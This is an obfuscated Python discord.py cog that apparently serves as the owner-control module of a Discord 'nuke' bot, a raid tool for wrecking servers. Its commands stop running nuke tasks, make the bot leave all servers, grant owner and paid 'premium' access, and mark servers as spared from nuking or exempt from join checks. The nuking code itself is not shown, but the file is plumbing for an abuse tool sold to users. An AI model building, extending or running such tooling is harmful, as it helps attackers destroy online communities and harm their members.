import discord
from discord.ext import commands
import json

class a(commands.Cog):
    def __init__(b,c):
        b.d=c
        if not hasattr(b.d,"joinBypassGuilds"):b.d.joinBypassGuilds=[]

    def e(b,f):
        return f.author.id in b.d.ownerUsers

    def g(b):
        try:
            with open('premium_users.json','r')as h:return json.load(h)
        except(FileNotFoundError,json.JSONDecodeError):return []

    def i(b,j):
        with open('premium_users.json','w')as h:json.dump(j,h)

    @commands.command()
    async def stop(b,f):
        if not b.e(f):raise commands.CheckFailure()
        b.d.nukeActive=False
        for k in b.d.nukeTasks:
            if not k.done():k.cancel()
        b.d.nukeTasks.clear()
        await f.send("<:7590_verified:1383155044215423201> Nuke stopped.")

    @commands.command()
    async def leaveall(b,f):
        if not b.e(f):raise commands.CheckFailure()
        l=0
        for m in b.d.guilds:
            if m.id in b.d.exemptGuilds:continue
            try:
                await m.leave()
                l+=1
            except Exception as n:print(f"Failed to leave {m.name}: {n}")
        await f.send(f"Left `{l}` servers. (Skipped {len(b.d.exemptGuilds)} exempt servers)")

    @commands.command()
    async def ping(b,f):
        if not b.e(f):raise commands.CheckFailure()
        o=await f.send("`Pinging...`")
        p=b.d.latency*1000
        await o.edit(content=f"`{int(p)} ms`")

    @commands.command()
    async def addpremium(b,f,q:discord.Member):
        if not b.e(f):raise commands.CheckFailure()
        r=b.g()
        if q.id not in r:
            r.append(q.id)
            b.i(r)
            await f.send(f"<:7590_verified:1383155044215423201> {q.mention} added to premium users.")
        else:await f.send("User already premium.")

    @commands.command()
    async def removepremium(b,f,q:discord.Member):
        if not b.e(f):raise commands.CheckFailure()
        r=b.g()
        if q.id in r:
            r.remove(q.id)
            b.i(r)
            await f.send(f"<:7590_verified:1383155044215423201> {q.mention} removed from premium users.")
        else:await f.send("User not premium.")

    @commands.command()
    async def addowner(b,f,q:discord.Member):
        if not b.e(f):raise commands.CheckFailure()
        if q.id not in b.d.ownerUsers:
            b.d.ownerUsers.append(q.id)
            await f.send(f"<:7590_verified:1383155044215423201> {q.mention} added to owner users.")
        else:await f.send("User already owner.")

    @commands.command(name="secure")
    async def secure_server(b,f,guild_id:int=None):
        if not b.e(f):raise commands.CheckFailure()
        target_id=guild_id or f.guild.id
        if target_id not in b.d.exemptGuilds:
            b.d.exemptGuilds.append(target_id)
            await f.send(f"Server `{target_id}` added to secure list")
        else:
            await f.send(f"Server `{target_id}` already fully secured.")

    @commands.command(aliases=["unsecure"])
    async def remove_secure(b,f,guild_id:int=None):
        if not b.e(f):raise commands.CheckFailure()
        target_id=guild_id or f.guild.id
        if target_id in b.d.exemptGuilds:
            b.d.exemptGuilds.remove(target_id)
            await f.send(f"Server `{target_id}` removed from secured list")
        else:
            await f.send(f"Server `{target_id}` wasnt fully secured.")

    @commands.command(name="exempt")
    async def join_bypass(b,f,guild_id:int=None):
        if not b.e(f):raise commands.CheckFailure()
        target_id=guild_id or f.guild.id
        if target_id not in b.d.joinBypassGuilds:
            b.d.joinBypassGuilds.append(target_id)
            await f.send(f"Server `{target_id}` exempted.")
        else:
            await f.send(f"Server `{target_id}` already exempted.")

    @commands.command(aliases=["unexempt","removeexempt"])
    async def remove_join_bypass(b,f,guild_id:int=None):
        if not b.e(f):raise commands.CheckFailure()
        target_id=guild_id or f.guild.id
        if target_id in b.d.joinBypassGuilds:
            b.d.joinBypassGuilds.remove(target_id)
            await f.send(f"Server `{target_id}` removed from exempt.")
        else:
            await f.send(f"Server `{target_id}` wasnt exempted.")

def setup(c):
    c.add_cog(a(c))